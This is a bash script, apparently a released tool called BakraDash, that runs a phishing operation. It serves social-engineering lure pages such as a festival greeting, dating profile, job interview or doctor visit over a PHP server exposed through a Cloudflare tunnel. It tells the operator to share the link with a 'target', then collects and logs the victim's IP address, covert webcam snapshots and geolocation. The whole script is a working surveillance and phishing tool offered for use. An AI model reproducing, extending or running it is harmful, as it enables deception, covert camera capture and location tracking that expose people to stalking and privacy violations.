#!/bin/bash
# BakraDash v1.0
# Brand: Linxploit | Mindless

trap 'printf "\n";stop' 2

banner() {
clear

BLUE='\e[1;94m'
RESET='\e[0m'

echo -e "${BLUE}

   _      _                  _       _ _   
  | |    (_)                | |     (_) |  
  | |     _ _ __ __  ___ __ | | ___  _| |_ 
  | |    | | '_ \\ \/ / '_ \| |/ _ \| | __|
  | |____| | | | |>  <| |_) | | (_) | | |_ 
  |______|_|_| |_/_/\_\ .__/|_|\___/|_|\__|
                      | |                  
                      |_|                  
${RESET}"
}

dependencies() {
    if ! command -v php > /dev/null 2>&1; then
        echo -e "\e[1;91m[!] PHP is required!\e[0m"
        exit 1
    fi
}

stop() {
    pkill -f -2 php > /dev/null 2>&1
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 php > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
    exit 1
}

catch_data() {
    if [[ -e "ip.txt" ]]; then
        printf "\n\e[1;92m🐐[\e[0m+\e[1;92m] Target IP captured!\e[0m\n"
        ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
        printf "\e[1;93m    📍 IP: \e[0m\e[1;97m%s\e[0m\n" "$ip"
        cat ip.txt >> saved.ip.txt
        rm -rf ip.txt
    fi

    if ls cam_*.png 1> /dev/null 2>&1; then
        printf "\n\e[1;92m🐐[\e[0m+\e[1;92m] Camera snapshot received!\e[0m\n"
        mkdir -p captured_images 2>/dev/null
        for cam in cam_*.png; do
            printf "\e[1;97m    📸 Saved: \e[0m\e[1;92m%s\e[0m\n" "$cam"
            mv "$cam" captured_images/ 2>/dev/null
        done
    fi

    if [[ -e "location_current.txt" ]]; then
        printf "\n\e[1;92m🐐[\e[0m+\e[1;92m] Location captured!\e[0m\n"
        while IFS= read -r line; do
            printf "\e[1;97m    %s\e[0m\n" "$line"
        done < location_current.txt
        mkdir -p saved_locations 2>/dev/null
        cat location_current.txt >> saved_locations/locations.log
        rm -rf location_current.txt
    fi
}

checkfound() {
    mkdir -p captured_images 2>/dev/null
    mkdir -p saved_locations 2>/dev/null
    printf "\n"
    printf "\e[1;92m🐐[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for target... Press Ctrl+C to exit\e[0m\n"
    printf "\e[1;92m🐐[\e[0m\e[1;77m*\e[0m\e[1;92m] Camera tracking \e[0m\e[1;91mACTIVE\e[0m\n"
    printf "\e[1;92m🐐[\e[0m\e[1;77m*\e[0m\e[1;92m] Location tracking \e[0m\e[1;91mACTIVE\e[0m\n"
    printf "\n"
    
    while true; do
        catch_data
        sleep 1
    done
}

select_template() {
    printf "\n"
    printf "\e[1;90m    ╔══════════════════════════════════════════════════╗\e[0m\n"
    printf "\e[1;90m    ║\e[0m\e[1;97m            TEMPLATES                 \e[0m\e[1;90m║\e[0m\n"
    printf "\e[1;90m    ╠══════════════════════════════════════════════════╣\e[0m\n"
    printf "\e[1;90m    ║\e[0m\e[1;92m  [1] Festival Greeting\e[0m\e[1;90m               ║\e[0m\n"
    printf "\e[1;90m    ║\e[0m\e[1;92m  [2] Online Meeting\e[0m\e[1;90m                  ║\e[0m\n"
    printf "\e[1;90m    ║\e[0m\e[1;92m  [3] Live Stream\e[0m\e[1;90m                     ║\e[0m\n"
    printf "\e[1;90m    ║\e[0m\e[1;92m  [4] Identity Verification\e[0m\e[1;90m           ║\e[0m\n"
    printf "\e[1;90m    ║\e[0m\e[1;92m  [5] Dating Profile\e[0m\e[1;90m                  ║\e[0m\n"
    printf "\e[1;90m    ║\e[0m\e[1;92m  [6] Support Chat\e[0m\e[1;90m                    ║\e[0m\n"
    printf "\e[1;90m    ║\e[0m\e[1;92m  [7] Job Interview\e[0m\e[1;90m                   ║\e[0m\n"
    printf "\e[1;90m    ║\e[0m\e[1;92m  [8] Doctor Visit\e[0m\e[1;90m                    ║\e[0m\n"
    printf "\e[1;90m    ╚══════════════════════════════════════════════════╝\e[0m\n"
    printf "\n"
    read -p $'\e[1;92m🐐[\e[0m+\e[1;92m] Choose template: \e[0m' template_opt

    case $template_opt in
        1) TEMPLATE_FILE="festival.html" ;;
        2) TEMPLATE_FILE="meeting.html" ;;
        3) TEMPLATE_FILE="livestream.html" ;;
        4) TEMPLATE_FILE="verification.html" ;;
        5) TEMPLATE_FILE="dating.html" ;;
        6) TEMPLATE_FILE="support.html" ;;
        7) TEMPLATE_FILE="jobinterview.html" ;;
        8) TEMPLATE_FILE="doctorvisit.html" ;;
        *) printf "\e[1;91m🐐[!] Invalid option\e[0m\n"; select_template ;;
    esac
}

tunnel_select() {
    printf "\n"
    printf "\e[1;90m    ╔══════════════════════════════════════════════════╗\e[0m\n"
    printf "\e[1;90m    ║\e[0m\e[1;97m           TUNNEL OPTIONS             \e[0m\e[1;90m║\e[0m\n"
    printf "\e[1;90m    ╠══════════════════════════════════════════════════╣\e[0m\n"
    printf "\e[1;90m    ║\e[0m\e[1;92m  [1] Cloudflare Tunnel (Recommended)\e[0m\e[1;90m ║\e[0m\n"
    printf "\e[1;90m    ║\e[0m\e[1;94m  [2] Localhost Only\e[0m\e[1;90m                  ║\e[0m\n"
    printf "\e[1;90m    ╚══════════════════════════════════════════════════╝\e[0m\n"
    printf "\n"
    read -p $'\e[1;92m🐐[\e[0m+\e[1;92m] Choose tunnel: \e[0m' tunnel_opt

    case $tunnel_opt in
        1) cloudflare_tunnel ;;
        2) localhost_server ;;
        *) printf "\e[1;91m🐐[!] Invalid option\e[0m\n"; tunnel_select ;;
    esac
}

cloudflare_tunnel() {
    if [[ ! -f cloudflared ]]; then
        printf "\e[1;92m🐐[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
        arch=$(uname -m)
        if [[ "$arch" == "aarch64" ]]; then
            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        elif [[ "$arch" == "armv7l" ]]; then
            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
        else
            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
        fi
        chmod +x cloudflared
    fi

    printf "\e[1;92m🐐[\e[0m+\e[1;92m] Starting PHP server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2

    printf "\e[1;92m🐐[\e[0m+\e[1;92m] Starting Cloudflare tunnel...\n"
    rm -rf .cloudflared.log
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
    sleep 8

    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .cloudflared.log)
    
    if [[ -z "$link" ]]; then
        printf "\e[1;91m🐐[!] Tunnel failed!\e[0m\n"
        exit 1
    fi

    printf "\n"
    printf "\e[1;92m══════════════════════════════════════════════════════════════════════\e[0m\n"
    printf "\e[1;97m     SHARE THIS LINK WITH YOUR TARGET \e[0m\n"
    printf "\e[1;92m══════════════════════════════════════════════════════════════════════\e[0m\n"
    printf "\e[1;96m    %s\e[0m\n" "$link"
    printf "\e[1;92m══════════════════════════════════════════════════════════════════════\e[0m\n"
    printf "\n"
    
    # Replace URLs in template and copy to index.html
    sed "s|https://colleges-digest-angela-cholesterol.trycloudflare.com|$link|g" "$TEMPLATE_FILE" > index.html
    checkfound
}

localhost_server() {
    printf "\e[1;92m🐐[\e[0m+\e[1;92m] Starting localhost server...\n"
    php -S 0.0.0.0:3333 > /dev/null 2>&1 &
    
    printf "\n"
    printf "\e[1;92m══════════════════════════════════════════════════════════════════════\e[0m\n"
    printf "\e[1;97m     LOCALHOST URLS \e[0m\n"
    printf "\e[1;92m══════════════════════════════════════════════════════════════════════\e[0m\n"
    printf "\e[1;96m    http://localhost:3333\e[0m\n"
    
    ip_addr=$(ip addr show 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1 | head -n1)
    if [[ -n "$ip_addr" ]]; then
        printf "\e[1;96m    http://%s:3333\e[0m\n" "$ip_addr"
    fi
    printf "\e[1;92m══════════════════════════════════════════════════════════════════════\e[0m\n"
    printf "\n"
    
    sed "s|https://colleges-digest-angela-cholesterol.trycloudflare.com|http://localhost:3333|g" "$TEMPLATE_FILE" > index.html
    checkfound
}

main() {
    banner
    dependencies
    select_template
    tunnel_select
}

main
